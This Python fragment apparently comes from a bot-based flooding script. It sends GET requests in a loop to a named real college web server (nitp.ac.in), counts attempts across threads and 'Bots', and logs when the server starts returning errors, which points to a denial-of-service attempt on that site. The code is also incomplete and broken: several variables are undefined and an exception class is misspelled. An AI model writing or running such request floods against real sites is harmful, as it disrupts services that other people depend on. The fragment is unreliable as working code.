#ADMlNxd NITP
import requests
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
LAST_ERROR = ""
SERVER = "http://nitp.ac.in/php/home.php"
for k in range(1005):
  STATUS_CODE = 100 
  try:
    res = requests.get(SERVER)
    STATUS_CODE = res.status_code
  except exception as e:
    STATUS_CODE = 600
    LAST_ERROR = str(e)
    print(e)
  if botNo == THREAD_COUNT - 1:
    ATTEMPT += 1
    if ATTEMPT % 500 == 0:
      LOGGING(f"🧔 #TASK\n#{GROUP_NAME} Group have completed {ATTEMPT} attempt with {THREAD_COUNT} Bots")
    if ATTEMPT%100 == 0:
      if STATUS_CODE>299:
        LOGGING(f"SERVER: {SERVER}\nSTATUS_CODE: {STATUS_CODE}\nLAST ERROR: {LAST_ERROR}\nGROUP: #{GROUP_NAME}\nATTEMPT: {ATTEMPT}")
      
